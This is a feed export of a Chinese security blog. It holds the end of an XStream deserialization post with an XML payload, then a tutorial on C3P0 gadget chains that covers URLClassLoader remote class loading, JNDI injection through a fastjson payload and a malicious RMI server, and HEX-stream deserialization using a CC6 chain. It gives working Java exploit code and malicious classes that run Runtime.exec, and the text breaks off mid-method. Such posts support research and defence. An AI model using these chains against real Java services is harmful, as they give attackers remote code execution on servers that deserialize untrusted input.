class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">activationCmd</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">activationCmd</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106153336587.png" alt="image-20241106153336587"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p><a href="https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&u_asig=1a0c399d17307034326662515e00b6&time__1311=n4+xyie7wxg0GODlxGrzGWwxYqGKG8AlD0O+iD">https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&amp;u_asig=1a0c399d17307034326662515e00b6&amp;time__1311=n4%2Bxyie7wxg0GODlxGrzGWwxYqGKG8AlD0O%2BiD</a></p><p>后面版本的修复都是黑白名单的形式来修复，这篇文章总结的更加详细：<a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xstream介绍&quot;&gt;&lt;a href=&quot;#XStream介绍&quot; class=&quot;headerlink&quot; title=&quot;XStream介绍&quot;&gt;&lt;/a&gt;XStream介绍&lt;/h1&gt;&lt;p&gt;XStream是一个简单的基于Java库，能够将Java对象和xml文档之间进行相互</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>C3P0利用链学习</title>
    <link href="https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-01T04:34:42.000Z</published>
    <updated>2024-11-03T16:12:10.757Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c3p0介绍"><a href="#C3P0介绍" class="headerlink" title="C3P0介绍"></a>C3P0介绍</h1><p>C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。</p><p>JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。<br>使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。</p><p>连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>C3P0的常见利用方式有三种：</p><ul><li>URLClassLoader远程类加载</li><li>JNDI注入</li><li>利用HEX序列化字节加载器进行反序列化攻击</li></ul><h2 id="urlclassloader远程类加载"><a href="#URLClassLoader远程类加载" class="headerlink" title="URLClassLoader远程类加载"></a>URLClassLoader远程类加载</h2><p>调用链</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PoolBackedDataSourceBase#readObject -&gt;<br>ReferenceSerialized#getObject -&gt;<br>ReferenceableUtils#referenceToObject -&gt;<br>ObjectFactory#getObjectInstance<br></code></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>首先来看PoolBackedDataSourceBase#readObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101134337171.png" alt="image-20241101134337171"></p><p>漏洞的触发入口就在这，如果反序列化得到的Object为IndirectlySerialized，就会调用其getObject方法</p><p>IndirectlySerialized是一个接口，他的实现类就是ReferenceSerialized，那接下来去看看他的getObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101135245450.png" alt="image-20241101135245450"></p><p>ReferenceSerialized类是ReferenceIndirector的一个内部类，而且可以看到这里其实已经出现了initialContext.lookup方法，但是我们在反序列化的时候其实是无法调用该方法的，因为contextName默认为null且不可控</p><p>那继续往下看ReferenceableUtils#referenceToObject方法</p><p><img src="https://cdn.clown2024.cn/image-20241101135741940.png" alt="image-20241101135741940"></p><p>可以看到这里就利用了URLClassLoader来进行远程类加载，只需要我们设置远程工厂类地址<code>fClassLocation</code></p><p>那现在还有一个问题，我们要如何构造ReferenceSerialized这个类呢，这个类从上面我们可以知道是一个私有的类，我们无法直接获取，那就看一下有谁调用了他的构造方法</p><p><img src="https://cdn.clown2024.cn/image-20241101185304051.png" alt="image-20241101185304051"></p><p>可以发现在外部类ReferenceIndirector#indirectForm方法里面进行了调用</p><p><img src="https://cdn.clown2024.cn/image-20241101185405398.png" alt="image-20241101185405398"></p><p>但是这个方法我们不方便调用，所以继续往上找，发现在PoolBackedDataSourceBase#writeObject方法里面进行了调用，所以我们在正常序列化的流程中就可以完成这个操作</p><p><img src="https://cdn.clown2024.cn/image-20241101190429527.png" alt="image-20241101190429527"></p><p>这里其实有两个indirectForm方法的调用，但是我们选择这个参数为ConnectionPoolDataSource的方法</p><p>我们可以看一下他走到这里的逻辑，可以看到他先尝试序列化ConnectionPoolDataSource，如果抛出不能反序列化的异常，他就会调用这个indirectForm方法</p><p>我们看一下这个类</p><p><img src="https://cdn.clown2024.cn/image-20241101191307567.png" alt="image-20241101191307567"></p><p>它本身是没有实现序列化接口的，那么我们只要找一个他的实现类且没有实现序列化接口就可以抛出异常，从而走到indirectForm方法的逻辑，或者自己实现这个接口也可以</p><h3 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>那现在我们就可以进行exp的编写了</p><p>这里采用自己实现ConnectionPoolDataSource接口的方法，而且这里我们还需要自己实现一个Referenceable接口，因为indirectForm方法里面传入Reference对象的方式不太一样</p><p><img src="https://cdn.clown2024.cn/image-20241101193611019.png" alt="image-20241101193611019"></p><p>这里是调用一个getReference方法来获取Reference对象的</p><p>最终exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_URLClassloader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;ExpClass&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改connectionPoolDataSource属性值为我们的恶意ConnectionPoolDataSource类</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//序列化流写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后去起一个8888端口的服务器，恶意类放在服务器下即可</p><p><img src="https://cdn.clown2024.cn/image-20241101194419904.png" alt="image-20241101194419904"></p><h2 id="jndi注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h2><p>该链子依赖于Fastjson和Jackson反序列化漏洞</p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#修改jndiName<br>JndiRefConnectionPoolDataSource#setJndiName -&gt;<br>JndiRefDataSourceBase#setJndiName<br> <br>#JNDI调用<br>JndiRefConnectionPoolDataSource#setLoginTimeout -&gt;<br>WrapperConnectionPoolDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#setLoginTimeout -&gt;<br>JndiRefForwardingDataSource#inner -&gt;<br>JndiRefForwardingDataSource#dereference() -&gt;<br>Context#lookup<br></code></pre></td></tr></table></figure><p>可以看到利用链都是从setter方法开始的，所以就可以很好配合fastjson或者Jackson利用链</p><h3 id="流程分析"><a href="#流程分析-1" class="headerlink" title="流程分析"></a>流程分析</h3><p>其漏洞点在于JndiRefConnectionPoolDataSource类中，该类有许多的setter和getter方法，其中我们可以通过setJndiName方法来给属性jndiName赋值</p><p><img src="https://cdn.clown2024.cn/image-20241102001706522.png" alt="image-20241102001706522"></p><p>他这里调用JndiRefConnectionPoolDataSource#setJndiName方法的时候，会再跳到JndiRefDataSourceBase#setJndiName方法</p><p><img src="https://cdn.clown2024.cn/image-20241102001802528.png" alt="image-20241102001802528"></p><p>修改了name之后我们就需要去触发调用，利用到的是JndiRefConnectionPoolDataSource#setLoginTimeout方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002128576.png" alt="image-20241102002128576"></p><p>然后调用WrapperConnectionPoolDataSource#setLoginTimeout方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002251962.png" alt="image-20241102002251962"></p><p>这里的getNestedDataSource返回的是JndiRefForwardingDataSource，因此这里调用的最终是<code>JndiRefForwardingDataSource#setLoginTimeout</code></p><p><img src="https://cdn.clown2024.cn/image-20241102002633572.png" alt="image-20241102002633572"></p><p>然后就是进入inner()方法</p><p><img src="https://cdn.clown2024.cn/image-20241102002706468.png" alt="image-20241102002706468"></p><p>在dereference()方法触发了jndi调用</p><p><img src="https://cdn.clown2024.cn/image-20241102002741246.png" alt="image-20241102002741246"></p><h3 id="利用链构造"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>选个低版本的fastjson来做例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDI_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;, &quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意rmi服务</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMI_Server</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,refObjWrapper);<br>        System.out.println(<span class="hljs-string">&quot;Registry运行中......&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMI_Server</span>().register();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类用前面远程类加载的那个</p><p><img src="https://cdn.clown2024.cn/image-20241103003238269.png" alt="image-20241103003238269"></p><h2 id="利用hex流加载任意类"><a href="#利用HEX流加载任意类" class="headerlink" title="利用HEX流加载任意类"></a>利用HEX流加载任意类</h2><p>该利用链能够反序列化一串十六进制字符串</p><p><strong>利用链</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#设置userOverridesAsString属性值<br>WrapperConnectionPoolDataSource#setuserOverridesAsString -&gt;<br>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString<br> <br>#初始化类时反序列化十六进制字节流<br>WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource -&gt;<br>C3P0ImplUtils#parseUserOverridesAsString -&gt;<br>SerializableUtils#fromByteArray -&gt;<br>SerializableUtils#deserializeFromByteArray -&gt;<br>ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h3 id="流程分析"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h3><p>该链子的成因是因为WrapperConnectionPoolDataSource的构造方法中对属性userOverrides的赋值存在异样写法</p><p><img src="https://cdn.clown2024.cn/image-20241103222535119.png" alt="image-20241103222535119"></p><p>这里调用C3P0ImplUtils#parseUserOverridesAsString方法将userOverrides解析成String，但userOverrides本身就是String类型，我们跟进去看看这个方法做了什么</p><p><img src="https://cdn.clown2024.cn/image-20241103223316471.png" alt="image-20241103223316471"></p><p>这里会将userOverrides的HASM_HEADER变量后面的十六进制字符串截取出来，HASM_HEADER的值为”HexAsciiSerializedMap”，还会将最后一位给去掉，所以我们后面设置变量的值的时候要加上这个字符串，而且最后一位加上多一个字符比如”;”来占位</p><p>然后解析该十六进制字符串为字节数组，并调用SerializableUtils#deserializeFromByteArray方法来处理字节数组，继续跟进去看看</p><p><img src="https://cdn.clown2024.cn/image-20241103224452045.png" alt="image-20241103224452045"></p><p>欸看到这个方法就很熟悉，字面意思就是反序列化该字节数组，再跟进去</p><p><img src="https://cdn.clown2024.cn/image-20241103224710588.png" alt="image-20241103224710588"></p><p>就可以看到直接调用了readObject方法</p><h3 id="利用链构造"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h3><p>上面的利用链构造就很简单了，直接用cc6的字节码来做示例</p><p>这里就直接用的枫师傅的exp，使用的是fastjson来触发利用链</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyVetoException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hex_Attack</span> &#123;<br><br>    <span class="hljs-comment">//CC6的利用链</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//使用InvokeTransformer包装一下</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//反射修改LazyMap类的factory属性</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span 